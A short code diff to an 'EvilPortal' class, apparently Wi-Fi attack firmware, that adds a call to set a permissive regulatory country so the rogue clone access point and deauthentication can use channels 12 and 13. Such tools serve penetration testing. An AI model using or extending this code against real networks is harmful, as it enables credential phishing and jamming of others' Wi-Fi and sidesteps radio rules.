@@ -130,6 +130,10 @@ void EvilPortal::beginAP() {
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
 
+    // Unlock ch 12/13 for the clone AP + deauth (boot-time country set never
+    // applies - the driver isn't up yet at that point).
+    wifiSetPermissiveCountry();
+
     if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
         Serial.println("[PORTAL] softAPConfig failed");
     }
